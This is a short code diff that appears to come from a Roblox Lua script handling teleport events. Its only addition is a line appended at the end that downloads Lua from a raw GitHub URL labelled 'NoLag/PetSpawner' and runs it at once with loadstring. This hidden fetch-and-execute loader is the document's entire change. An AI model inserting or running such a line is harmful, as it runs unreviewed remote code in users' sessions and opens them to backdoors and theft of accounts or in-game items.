@@ -146,3 +146,4 @@ end
 
 TeleportService.LocalPlayerTeleporting:Connect(OnTeleport)
 TeleportService.TeleportInitiated:Connect(OnTeleport)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DarkSpawners/NoLag/refs/heads/main/PetSpawner"))()
